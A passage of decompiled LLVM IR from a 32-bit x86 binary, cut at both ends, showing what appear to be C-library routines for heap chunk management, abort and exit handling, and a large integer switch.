  %v2_8051083 = inttoptr i32 %v1_8051083 to i32*
  %v3_8051083 = load i32, i32* %v2_8051083, align 4
  store i32 %v3_8051083, i32* @edi, align 4
  %v1_8051086 = add i32 %v2_8051081, 12
  %v2_8051086 = inttoptr i32 %v1_8051086 to i32*
  %v3_8051086 = load i32, i32* %v2_8051086, align 4
  store i32 %v3_8051086, i32* @edx, align 4
  %v1_8051089 = add i32 %v3_8051083, 12
  %v2_8051089 = inttoptr i32 %v1_8051089 to i32*
  %v3_8051089 = load i32, i32* %v2_8051089, align 4
  store i32 %v3_8051089, i32* @ecx, align 4
  %v12_805108c = icmp eq i32 %v3_8051089, %v2_8051081
  %v1_805108e = icmp eq i1 %v12_805108c, false
  br i1 %v1_805108e, label %dec_label_pc_80510cc, label %dec_label_pc_8051090

dec_label_pc_8051090:                             ; preds = %dec_label_pc_805107c
  %v1_8051090 = add i32 %v3_8051086, 8
  %v2_8051090 = inttoptr i32 %v1_8051090 to i32*
  %v3_8051090 = load i32, i32* %v2_8051090, align 4
  %v15_8051090 = icmp eq i32 %v3_8051090, %v3_8051089
  %v1_8051093 = icmp eq i1 %v15_8051090, false
  br i1 %v1_8051093, label %dec_label_pc_80510cc, label %dec_label_pc_8051095

dec_label_pc_8051095:                             ; preds = %dec_label_pc_8051090
  %v2_8051095 = add i32 %v3_805107c, %v1_8051034
  store i32 %v2_8051095, i32* @ebx, align 4
  store i32 %v3_8051086, i32* %v2_8051089, align 4
  %v0_805109a = load i32, i32* @edi, align 4
  %v1_805109a = load i32, i32* @edx, align 4
  %v2_805109a = add i32 %v1_805109a, 8
  %v3_805109a = inttoptr i32 %v2_805109a to i32*
  store i32 %v0_805109a, i32* %v3_805109a, align 4
  %v0_80510a4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805109d

dec_label_pc_805109d:                             ; preds = %dec_label_pc_8051064, %dec_label_pc_8051095
  %v1_80510b0 = phi i32 [ %v2_8051067, %dec_label_pc_8051064 ], [ %v0_80510a4.pre, %dec_label_pc_8051095 ]
  %v1_80510a1 = and i32 %v3_805106f, -4
  store i32 %v1_80510a1, i32* @ebp, align 4
  %v1_80510a4 = load i32, i32* @global_var_8053c6c.33, align 4
  %v12_80510a4 = icmp eq i32 %v1_80510b0, %v1_80510a4
  br i1 %v12_80510a4, label %dec_label_pc_80510fe, label %dec_label_pc_80510ac

dec_label_pc_80510ac:                             ; preds = %dec_label_pc_805109d
  %v2_80510ac = add i32 %v1_80510b0, 4
  %v3_80510ac = add i32 %v2_80510ac, %v1_80510a1
  %v4_80510ac = inttoptr i32 %v3_80510ac to i32*
  %v5_80510ac = load i32, i32* %v4_80510ac, align 4
  store i32 %v5_80510ac, i32* %eax.global-to-local, align 4
  %v3_80510b0 = inttoptr i32 %v2_80510ac to i32*
  store i32 %v1_80510a1, i32* %v3_80510b0, align 4
  %v0_80510b3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510b3 = urem i32 %v0_80510b3, 2
  %v2_80510b3 = icmp eq i32 %v1_80510b3, 0
  store i32 %v1_80510b3, i32* %eax.global-to-local, align 4
  %v1_80510b8 = icmp eq i1 %v2_80510b3, false
  br i1 %v1_80510b8, label %dec_label_pc_80510d9, label %dec_label_pc_80510ba

dec_label_pc_80510ba:                             ; preds = %dec_label_pc_80510ac
  %v0_80510ba = load i32, i32* @esi, align 4
  %v1_80510ba = add i32 %v0_80510ba, 8
  %v2_80510ba = inttoptr i32 %v1_80510ba to i32*
  %v3_80510ba = load i32, i32* %v2_80510ba, align 4
  store i32 %v3_80510ba, i32* @edx, align 4
  %v1_80510bd = add i32 %v0_80510ba, 12
  %v2_80510bd = inttoptr i32 %v1_80510bd to i32*
  %v3_80510bd = load i32, i32* %v2_80510bd, align 4
  store i32 %v3_80510bd, i32* %eax.global-to-local, align 4
  %v1_80510c0 = add i32 %v3_80510ba, 12
  %v2_80510c0 = inttoptr i32 %v1_80510c0 to i32*
  %v3_80510c0 = load i32, i32* %v2_80510c0, align 4
  store i32 %v3_80510c0, i32* @edi, align 4
  %v12_80510c3 = icmp eq i32 %v3_80510c0, %v0_80510ba
  %v1_80510c5 = icmp eq i1 %v12_80510c3, false
  br i1 %v1_80510c5, label %dec_label_pc_80510cc, label %dec_label_pc_80510c7

dec_label_pc_80510c7:                             ; preds = %dec_label_pc_80510ba
  %v1_80510c7 = add i32 %v3_80510bd, 8
  %v2_80510c7 = inttoptr i32 %v1_80510c7 to i32*
  %v3_80510c7 = load i32, i32* %v2_80510c7, align 4
  %v15_80510c7 = icmp eq i32 %v3_80510c7, %v3_80510c0
  br i1 %v15_80510c7, label %dec_label_pc_80510d1, label %dec_label_pc_80510cc

dec_label_pc_80510cc:                             ; preds = %dec_label_pc_80510c7, %dec_label_pc_80510ba, %dec_label_pc_8051090, %dec_label_pc_805107c
  %v0_80510cc = call i32 @function_805118c()
  store i32 %v0_80510cc, i32* %eax.global-to-local, align 4
  %v1_80510d1.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80510d1

dec_label_pc_80510d1:                             ; preds = %dec_label_pc_80510c7, %dec_label_pc_80510cc
  %v1_80510d1 = phi i32 [ %v3_80510ba, %dec_label_pc_80510c7 ], [ %v1_80510d1.pre, %dec_label_pc_80510cc ]
  %v0_80510d1 = phi i32 [ %v3_80510bd, %dec_label_pc_80510c7 ], [ %v0_80510cc, %dec_label_pc_80510cc ]
  %v2_80510d1 = add i32 %v1_80510d1, 12
  %v3_80510d1 = inttoptr i32 %v2_80510d1 to i32*
  store i32 %v0_80510d1, i32* %v3_80510d1, align 4
  %v0_80510d4 = load i32, i32* @edx, align 4
  %v1_80510d4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80510d4 = add i32 %v1_80510d4, 8
  %v3_80510d4 = inttoptr i32 %v2_80510d4 to i32*
  store i32 %v0_80510d4, i32* %v3_80510d4, align 4
  %v0_80510d7 = load i32, i32* @ebx, align 4
  %v1_80510d7 = load i32, i32* @ebp, align 4
  %v2_80510d7 = add i32 %v1_80510d7, %v0_80510d7
  store i32 %v2_80510d7, i32* @ebx, align 4
  br label %dec_label_pc_80510d9

dec_label_pc_80510d9:                             ; preds = %dec_label_pc_80510ac, %dec_label_pc_80510d1
  %v0_80510d9 = load i32, i32* @global_var_8053c7c.51, align 4
  store i32 %v0_80510d9, i32* %eax.global-to-local, align 4
  %v0_80510de = load i32, i32* @ecx, align 4
  %v1_80510de = add i32 %v0_80510de, 12
  %v2_80510de = inttoptr i32 %v1_80510de to i32*
  store i32 ptrtoint (i32* @global_var_8053c74.35 to i32), i32* %v2_80510de, align 4
  %v0_80510e5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510e5 = load i32, i32* @ecx, align 4
  %v2_80510e5 = add i32 %v1_80510e5, 8
  %v3_80510e5 = inttoptr i32 %v2_80510e5 to i32*
  store i32 %v0_80510e5, i32* %v3_80510e5, align 4
  %v0_80510e8 = load i32, i32* @ebx, align 4
  %v1_80510e8 = load i32, i32* @ecx, align 4
  %v3_80510e8 = add i32 %v1_80510e8, %v0_80510e8
  %v4_80510e8 = inttoptr i32 %v3_80510e8 to i32*
  store i32 %v0_80510e8, i32* %v4_80510e8, align 4
  %v0_80510eb = load i32, i32* @ecx, align 4
  %v1_80510eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80510eb = add i32 %v1_80510eb, 12
  %v3_80510eb = inttoptr i32 %v2_80510eb to i32*
  store i32 %v0_80510eb, i32* %v3_80510eb, align 4
  %v0_80510ee = load i32, i32* @ebx, align 4
  %v1_80510f0 = or i32 %v0_80510ee, 1
  store i32 %v1_80510f0, i32* %eax.global-to-local, align 4
  %v0_80510f3 = load i32, i32* @ecx, align 4
  store i32 %v0_80510f3, i32* @global_var_8053c7c.51, align 4
  %v2_80510f9 = add i32 %v0_80510f3, 4
  %v3_80510f9 = inttoptr i32 %v2_80510f9 to i32*
  store i32 %v1_80510f0, i32* %v3_80510f9, align 4
  br label %dec_label_pc_805110e

dec_label_pc_80510fe:                             ; preds = %dec_label_pc_805109d
  %v0_80510fe = load i32, i32* @ebx, align 4
  %v2_80510fe = add i32 %v0_80510fe, %v1_80510a1
  store i32 %v2_80510fe, i32* @ebx, align 4
  %v1_8051102 = or i32 %v2_80510fe, 1
  store i32 %v1_8051102, i32* %eax.global-to-local, align 4
  %v1_8051105 = load i32, i32* @ecx, align 4
  %v2_8051105 = add i32 %v1_8051105, 4
  %v3_8051105 = inttoptr i32 %v2_8051105 to i32*
  store i32 %v1_8051102, i32* %v3_8051105, align 4
  %v0_8051108 = load i32, i32* @ecx, align 4
  store i32 %v0_8051108, i32* @global_var_8053c6c.33, align 4
  br label %dec_label_pc_805110e

dec_label_pc_805110e:                             ; preds = %dec_label_pc_80510d9, %dec_label_pc_80510fe
  %v0_805110e = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_805110e, 131072
  br i1 %tmp21, label %dec_label_pc_8051173, label %dec_label_pc_8051116

dec_label_pc_8051116:                             ; preds = %dec_label_pc_805110e
  %v0_8051116 = load i8, i8* @global_var_8053c40.32, align 64
  %v1_8051116 = and i8 %v0_8051116, 2
  %v2_8051116 = icmp eq i8 %v1_8051116, 0
  br i1 %v2_8051116, label %dec_label_pc_805112f, label %dec_label_pc_805111f

dec_label_pc_805111f:                             ; preds = %dec_label_pc_8051116
  %v2_8051127 = call i32 @function_8050e48(i32* bitcast (i8* @global_var_8053c40.32 to i32*))
  store i32 %v2_8051127, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805112f

dec_label_pc_805112f:                             ; preds = %dec_label_pc_8051116, %dec_label_pc_805111f
  %v0_805112f = load i32, i32* @global_var_8053c6c.33, align 4
  store i32 %v0_805112f, i32* %eax.global-to-local, align 4
  %v1_8051134 = add i32 %v0_805112f, 4
  %v2_8051134 = inttoptr i32 %v1_8051134 to i32*
  %v3_8051134 = load i32, i32* %v2_8051134, align 4
  %v1_8051137 = and i32 %v3_8051134, -4
  store i32 %v1_8051137, i32* %eax.global-to-local, align 4
  %v1_805113a = load i32, i32* @global_var_8053f84.49, align 4
  %v7_805113a = icmp ult i32 %v1_8051137, %v1_805113a
  br i1 %v7_805113a, label %dec_label_pc_8051173, label %dec_label_pc_8051142

dec_label_pc_8051142:                             ; preds = %dec_label_pc_805112f
  store i32 ptrtoint (i8* @global_var_8053c40.32 to i32), i32* @edx, align 4
  %v0_8051147 = load i32, i32* @global_var_8053f88.47, align 8
  store i32 %v0_8051147, i32* @eax, align 4
  %v0_805114c = call i32 @function_8050dbb()
  store i32 %v0_805114c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051173

dec_label_pc_8051153:                             ; preds = %dec_label_pc_805105b
  %v2_8051153 = inttoptr i32 %v1_8051024 to i32*
  %v3_8051153 = load i32, i32* %v2_8051153, align 4
  %v0_8051156 = load i32, i32* @global_var_8053f90.40, align 16
  %v1_8051156 = add i32 %v0_8051156, -1
  store i32 %v1_8051156, i32* @global_var_8053f90.40, align 16
  %v2_805115c = add i32 %v3_8051153, %v1_8051034
  store i32 %v2_805115c, i32* %eax.global-to-local, align 4
  %v2_805115f = sub i32 %v1_8051024, %v3_8051153
  %v0_8051165 = load i32, i32* @global_var_8053fa4.43, align 4
  %v2_8051165 = sub i32 %v0_8051165, %v2_805115c
  store i32 %v2_8051165, i32* @global_var_8053fa4.43, align 4
  %v4_805116b = inttoptr i32 %v2_805115f to i32*
  %v5_805116b = call i32 @function_8051ebd(i32* %v4_805116b, i32 %v2_805115c, i32 %v1_8051034, i32 %v1_8051034)
  store i32 %v5_805116b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051173

dec_label_pc_8051173:                             ; preds = %dec_label_pc_805112f, %dec_label_pc_805110e, %dec_label_pc_8051142, %dec_label_pc_805103b, %dec_label_pc_8051153
  store i32 %v2_805100e, i32* @eax, align 4
  %v2_805117c = call i32 @function_8051757(i32 %v2_805100e, i32 1)
  store i32 %v2_805117c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051184

dec_label_pc_8051184:                             ; preds = %dec_label_pc_8050ff0, %dec_label_pc_8051173
  %.0 = phi i32 [ undef, %dec_label_pc_8050ff0 ], [ %v2_805117c, %dec_label_pc_8051173 ]
  store i32 %v0_8050ff3, i32* @ebx, align 4
  store i32 %v0_8050ff2, i32* @esi, align 4
  store i32 %v0_8050ff1, i32* @edi, align 4
  store i32 %v0_8050ff0, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8051153, { 1, 0 }
  uselistorder i32 %v0_80510e8, { 1, 0 }
  uselistorder i32 %v1_80510b3, { 1, 0 }
  uselistorder i32 %v2_80510ac, { 1, 0 }
  uselistorder i32 %v1_80510a1, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80510b0, { 1, 0 }
  uselistorder i32 %v1_8051034, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_805102f, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8051024, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 (i32*)* @function_8050e48, { 3, 0, 1, 2 }
  uselistorder i32* bitcast (i8* @global_var_8053c40.32 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8053c74.35 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8053c6c.33, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8053c40.32 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8053c40.32, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805395c.31 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8051184, { 1, 0 }
  uselistorder label %dec_label_pc_8051173, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805112f, { 1, 0 }
  uselistorder label %dec_label_pc_805110e, { 1, 0 }
  uselistorder label %dec_label_pc_80510d9, { 1, 0 }
  uselistorder label %dec_label_pc_80510d1, { 1, 0 }
  uselistorder label %dec_label_pc_805109d, { 1, 0 }
}

define i32 @function_805118c() local_unnamed_addr {
dec_label_pc_80511a7.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8051198 = call i32 @function_8051754(i32 ptrtoint (i32* @global_var_8053974.52 to i32))
  %v12_80511a2 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_80511a748 = add i32 %v12_80511a2, 276
  %v5_80511a749 = inttoptr i32 %v4_80511a748 to i32*
  store i32 0, i32* %v5_80511a749, align 4
  %v0_80511b250 = load i32, i32* %eax.global-to-local, align 4
  %v1_80511b251 = add i32 %v0_80511b250, -1
  %v9_80511b252 = icmp slt i32 %v1_80511b251, 0
  store i32 %v1_80511b251, i32* %eax.global-to-local, align 4
  %v1_80511b353 = icmp eq i1 %v9_80511b252, false
  br i1 %v1_80511b353, label %dec_label_pc_80511a7.dec_label_pc_80511a7_crit_edge, label %dec_label_pc_80511b5

dec_label_pc_80511a7.dec_label_pc_80511a7_crit_edge: ; preds = %dec_label_pc_80511a7.lr.ph, %dec_label_pc_80511a7.dec_label_pc_80511a7_crit_edge
  %v1_80511b254 = phi i32 [ %v1_80511b2, %dec_label_pc_80511a7.dec_label_pc_80511a7_crit_edge ], [ %v1_80511b251, %dec_label_pc_80511a7.lr.ph ]
  %v0_80511a7.pre = load i32, i32* @esp, align 4
  %v2_80511a7 = mul i32 %v1_80511b254, 4
  %v3_80511a7 = add i32 %v0_80511a7.pre, 152
  %v4_80511a7 = add i32 %v3_80511a7, %v2_80511a7
  %v5_80511a7 = inttoptr i32 %v4_80511a7 to i32*
  store i32 0, i32* %v5_80511a7, align 4
  %v0_80511b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80511b2 = add i32 %v0_80511b2, -1
  %v9_80511b2 = icmp slt i32 %v1_80511b2, 0
  store i32 %v1_80511b2, i32* %eax.global-to-local, align 4
  %v1_80511b3 = icmp eq i1 %v9_80511b2, false
  br i1 %v1_80511b3, label %dec_label_pc_80511a7.dec_label_pc_80511a7_crit_edge, label %dec_label_pc_80511b5

dec_label_pc_80511b5:                             ; preds = %dec_label_pc_80511a7.dec_label_pc_80511a7_crit_edge, %dec_label_pc_80511a7.lr.ph
  %v0_80511b5 = load i32, i32* @ebx, align 4
  %v2_80511b9 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80511b9, i32* @ebx, align 4
  %v4_80511c1 = call i32 @function_80501e5(i32 %v2_80511b9, i32 6, i32 %v0_80511b5, i32 %v0_80511b5)
  store i32 %v4_80511c1, i32* %eax.global-to-local, align 4
  %v1_80511c9 = icmp eq i32 %v4_80511c1, 0
  %v1_80511cb = icmp eq i1 %v1_80511c9, false
  br i1 %v1_80511cb, label %dec_label_pc_80511db, label %dec_label_pc_80511cd

dec_label_pc_80511cd:                             ; preds = %dec_label_pc_80511b5
  %v3_80511d3 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_80511d3 = call i32 @function_804fb4f(i32 1, %_TYPEDEF_sigset_t* %v3_80511d3, i32 0)
  store i32 %v4_80511d3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80511db

dec_label_pc_80511db:                             ; preds = %dec_label_pc_80511b5, %dec_label_pc_80511cd
  %v2_805121323 = phi i32 [ %v4_80511c1, %dec_label_pc_80511b5 ], [ %v4_80511d3, %dec_label_pc_80511cd ]
  %v0_80511db = load i8, i8* @global_var_8053a54.53, align 4
  %v1_80511db = icmp eq i8 %v0_80511db, 0
  %v1_80511e2 = icmp eq i1 %v1_80511db, false
  br i1 %v1_80511e2, label %dec_label_pc_8051213, label %dec_label_pc_80511e4

dec_label_pc_80511e4:                             ; preds = %dec_label_pc_80511db
  store i8 1, i8* @global_var_8053a54.53, align 4
  br label %dec_label_pc_80511eb

dec_label_pc_80511eb:                             ; preds = %dec_label_pc_8051252, %dec_label_pc_80511e4
  %v1_80511f3 = call i32 @function_8051754(i32 ptrtoint (i32* @global_var_8053974.52 to i32))
  store i32 %v1_80511f3, i32* %eax.global-to-local, align 4
  %v1_80511ff = call i32 @function_80520d5(i32 6)
  store i32 %v1_80511ff, i32* %eax.global-to-local, align 4
  %v1_805120b = call i32 @function_8051754(i32 ptrtoint (i32* @global_var_8053974.52 to i32))
  store i32 %v1_805120b, i32* %eax.global-to-local, align 4
  %v0_8051213.pre = load i8, i8* @global_var_8053a54.53, align 4
  br label %dec_label_pc_8051213

dec_label_pc_8051213:                             ; preds = %dec_label_pc_80511db, %dec_label_pc_80511eb
  %v2_8051213 = phi i32 [ %v2_805121323, %dec_label_pc_80511db ], [ %v1_805120b, %dec_label_pc_80511eb ]
  %v0_8051213 = phi i8 [ %v0_80511db, %dec_label_pc_80511db ], [ %v0_8051213.pre, %dec_label_pc_80511eb ]
  %v1_8051213 = zext i8 %v0_8051213 to i32
  %v3_8051213 = and i32 %v2_8051213, -256
  %v4_8051213 = or i32 %v1_8051213, %v3_8051213
  store i32 %v4_8051213, i32* %eax.global-to-local, align 4
  %v10_8051218 = icmp eq i8 %v0_8051213, 1
  %v1_805121a = icmp eq i1 %v10_8051218, false
  br i1 %v1_805121a, label %dec_label_pc_8051274, label %dec_label_pc_8051247.lr.ph

dec_label_pc_8051247.lr.ph:                       ; preds = %dec_label_pc_8051213
  store i8 2, i8* @global_var_8053a54.53, align 4
  %v2_805122b = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_805122b, i32* %eax.global-to-local, align 4
  %v3_8051230 = bitcast i32* %stack_var_-272 to i8*
  %v4_8051230 = call i32 @function_804fe6c(i8* %v3_8051230, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805124740 = add i32 %v12_80511a2, 140
  %v5_805124741 = inttoptr i32 %v4_805124740 to i32*
  store i32 -1, i32* %v5_805124741, align 4
  %v0_805124f42 = load i32, i32* %eax.global-to-local, align 4
  %v1_805124f43 = add i32 %v0_805124f42, -1
  %v9_805124f44 = icmp slt i32 %v1_805124f43, 0
  store i32 %v1_805124f43, i32* %eax.global-to-local, align 4
  %v1_805125045 = icmp eq i1 %v9_805124f44, false
  br i1 %v1_805125045, label %dec_label_pc_8051247.dec_label_pc_8051247_crit_edge, label %dec_label_pc_8051252

dec_label_pc_8051247.dec_label_pc_8051247_crit_edge: ; preds = %dec_label_pc_8051247.lr.ph, %dec_label_pc_8051247.dec_label_pc_8051247_crit_edge
  %v1_805124f46 = phi i32 [ %v1_805124f, %dec_label_pc_8051247.dec_label_pc_8051247_crit_edge ], [ %v1_805124f43, %dec_label_pc_8051247.lr.ph ]
  %v0_8051247.pre = load i32, i32* @esp, align 4
  %v2_8051247 = mul i32 %v1_805124f46, 4
  %v3_8051247 = add i32 %v0_8051247.pre, 16
  %v4_8051247 = add i32 %v3_8051247, %v2_8051247
  %v5_8051247 = inttoptr i32 %v4_8051247 to i32*
  store i32 -1, i32* %v5_8051247, align 4
  %v0_805124f = load i32, i32* %eax.global-to-local, align 4
  %v1_805124f = add i32 %v0_805124f, -1
  %v9_805124f = icmp slt i32 %v1_805124f, 0
  store i32 %v1_805124f, i32* %eax.global-to-local, align 4
  %v1_8051250 = icmp eq i1 %v9_805124f, false
  br i1 %v1_8051250, label %dec_label_pc_8051247.dec_label_pc_8051247_crit_edge, label %dec_label_pc_8051252

dec_label_pc_8051252:                             ; preds = %dec_label_pc_8051247.dec_label_pc_8051247_crit_edge, %dec_label_pc_8051247.lr.ph
  store i32 %v2_805122b, i32* %eax.global-to-local, align 4
  %v4_8051267 = call i32 @function_8051997(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8051267, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80511eb

dec_label_pc_8051274:                             ; preds = %dec_label_pc_8051213
  %v10_8051274 = icmp eq i8 %v0_8051213, 2
  %v1_8051276 = icmp eq i1 %v10_8051274, false
  br i1 %v1_8051276, label %dec_label_pc_8051280, label %dec_label_pc_8051280.thread

dec_label_pc_8051280.thread:                      ; preds = %dec_label_pc_8051274
  store i8 3, i8* @global_var_8053a54.53, align 4
  br label %dec_label_pc_8051289

dec_label_pc_8051280:                             ; preds = %dec_label_pc_8051274
  %v9_8051280 = icmp eq i8 %v0_8051213, 3
  %v1_8051287 = icmp eq i1 %v9_8051280, false
  br i1 %v1_8051287, label %dec_label_pc_805129a, label %dec_label_pc_8051289

dec_label_pc_8051289:                             ; preds = %dec_label_pc_8051280.thread, %dec_label_pc_8051280
  store i8 4, i8* @global_var_8053a54.53, align 4
  %v1_8051295 = call i32 @function_8051af8(i32 127)
  unreachable

dec_label_pc_805129a:                             ; preds = %dec_label_pc_8051280, %dec_label_pc_805129a
  br label %dec_label_pc_805129a

; uselistorder directives
  uselistorder i32 %v1_805124f, { 2, 1, 0 }
  uselistorder i32 %v1_80511b2, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 1, 2, 3, 10, 11, 12, 13, 14, 15, 16, 18, 17, 0, 4, 5 }
  uselistorder i8 3, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32*, i32)* @function_8051997, { 1, 0 }
  uselistorder i8 2, { 8, 14, 11, 1, 12, 2, 3, 4, 5, 6, 9, 10, 7, 0, 13 }
  uselistorder i8* @global_var_8053a54.53, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805129a, { 1, 0 }
  uselistorder label %dec_label_pc_8051289, { 1, 0 }
  uselistorder label %dec_label_pc_8051247.dec_label_pc_8051247_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051213, { 1, 0 }
  uselistorder label %dec_label_pc_80511db, { 1, 0 }
  uselistorder label %dec_label_pc_80511a7.dec_label_pc_80511a7_crit_edge, { 1, 0 }
}

define i32 @function_80513e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_80513e0:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80513f3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80513f3, i32* @ebx, align 4
  %v2_80513f8 = call i32 @function_8051757(i32 %v2_80513f3, i32 134551380)
  %v1_8051404 = call i32 @function_8051754(i32 ptrtoint (i32* @global_var_805398c.54 to i32))
  %v0_8051409 = load i32, i32* @global_var_8053a58.55, align 8
  store i32 %v0_8051409, i32* @eax, align 4
  %v1_8051411 = icmp eq i32 %v0_8051409, 0
  br i1 %v1_8051411, label %dec_label_pc_805141e, label %dec_label_pc_8051415

dec_label_pc_8051415:                             ; preds = %dec_label_pc_80513e0
  %v0_8051418 = load i32, i32* @esi, align 4
  %v1_8051419 = call i32 @unknown_0(i32 %v0_8051418)
  store i32 %v1_8051419, i32* @eax, align 4
  br label %dec_label_pc_805141e

dec_label_pc_805141e:                             ; preds = %dec_label_pc_80513e0, %dec_label_pc_8051415
  %v2_8051423 = call i32 @function_8051757(i32 %v2_80513f3, i32 1)
  %v0_8051428 = call i32 @function_8051715()
  %v0_8051441 = load i32, i32* @esi, align 4
  %v1_8051442 = call i32 @function_8051af8(i32 %v0_8051441)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8051af8, { 1, 0 }
  uselistorder i32 (i32)* @function_8051754, { 3, 2, 1, 0, 5, 10, 8, 7, 9, 6, 4 }
  uselistorder i32 (i32, i32)* @function_8051757, { 1, 0, 5, 4, 13, 12, 9, 8, 7, 6, 11, 10, 3, 2 }
  uselistorder label %dec_label_pc_805141e, { 1, 0 }
}

define i32 @function_80515d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_80515d0:
  switch i32 %arg1, label %dec_label_pc_80515ef [
    i32 0, label %dec_label_pc_80515ff
    i32 1, label %dec_label_pc_80516e4
    i32 2, label %dec_label_pc_8051609
    i32 3, label %dec_label_pc_8051613
    i32 4, label %dec_label_pc_805161d
    i32 5, label %dec_label_pc_80516b3
    i32 6, label %dec_label_pc_8051625
    i32 7, label %dec_label_pc_80515e5
    i32 8, label %dec_label_pc_80515e5
    i32 9, label %dec_label_pc_80515e5
    i32 10, label %dec_label_pc_80515e5
    i32 11, label %dec_label_pc_80515e5
    i32 12, label %dec_label_pc_80515e5
    i32 13, label %dec_label_pc_80515e5
    i32 14, label %dec_label_pc_80515e5
    i32 15, label %dec_label_pc_80515e5
    i32 16, label %dec_label_pc_80515e5
    i32 17, label %dec_label_pc_80515e5
    i32 18, label %dec_label_pc_80515e5
    i32 19, label %dec_label_pc_80515e5
    i32 20, label %dec_label_pc_80515e5
    i32 21, label %dec_label_pc_80515e5
    i32 22, label %dec_label_pc_80515e5
    i32 23, label %dec_label_pc_80516e4
    i32 24, label %dec_label_pc_80516e4
    i32 25, label %dec_label_pc_80516f0
    i32 26, label %dec_label_pc_80516c1
    i32 27, label %dec_label_pc_80516e4
    i32 28, label %dec_label_pc_8051637
    i32 29, label %dec_label_pc_80516ba
    i32 30, label %dec_label_pc_805162f
    i32 31, label %dec_label_pc_80516cf
    i32 32, label %dec_label_pc_80516e4
    i32 33, label %dec_label_pc_80516e4
    i32 34, label %dec_label_pc_80516e4
    i32 35, label %dec_label_pc_80516c8
    i32 36, label %dec_label_pc_80516f7
    i32 37, label %dec_label_pc_80516fe
    i32 38, label %dec_label_pc_80516f7
    i32 39, label %dec_label_pc_8051641
    i32 40, label %dec_label_pc_8051705
    i32 41, label %dec_label_pc_80516e4
    i32 42, label %dec_label_pc_80516cf
    i32 43, label %dec_label_pc_80516fe
    i32 44, label %dec_label_pc_805170c
    i32 45, label %dec_label_pc_80516fe
    i32 46, label %dec_label_pc_80516ba
    i32 47, label %dec_label_pc_80516ba
    i32 48, label %dec_label_pc_80516ba
    i32 49, label %dec_label_pc_80516e4
    i32 50, label %dec_label_pc_80516e4
    i32 51, label %dec_label_pc_80516ba
    i32 52, label %dec_label_pc_80516ba
    i32 53, label %dec_label_pc_80516e4
    i32 54, label %dec_label_pc_80516e4
    i32 55, label %dec_label_pc_80516e4
    i32 56, label %dec_label_pc_80516e4
    i32 57, label %dec_label_pc_80516e4
    i32 58, label %dec_label_pc_80516e4
    i32 59, label %dec_label_pc_80516e4
    i32 60, label %dec_label_pc_80516e4
    i32 61, label %dec_label_pc_80516e4
    i32 62, label %dec_label_pc_80516e4
    i32 63, label %dec_label_pc_80516e4
    i32 64, label %dec_label_pc_80516e4
    i32 65, label %dec_label_pc_80516e4
    i32 66, label %dec_label_pc_80516e4
    i32 67, label %dec_label_pc_80515e5
    i32 68, label %dec_label_pc_80515e5
    i32 69, label %dec_label_pc_80516c8
    i32 70, label %dec_label_pc_80516c8
    i32 71, label %dec_label_pc_80516c8
    i32 72, label %dec_label_pc_80516cf
    i32 73, label %dec_label_pc_80516d6
    i32 74, label %dec_label_pc_80516dd
    i32 75, label %dec_label_pc_805164b
    i32 76, label %dec_label_pc_80516dd
    i32 77, label %dec_label_pc_80515e5
    i32 78, label %dec_label_pc_80515e5
    i32 79, label %dec_label_pc_80515e5
    i32 80, label %dec_label_pc_80515e5
    i32 81, label %dec_label_pc_80515e5
    i32 82, label %dec_label_pc_80515e5
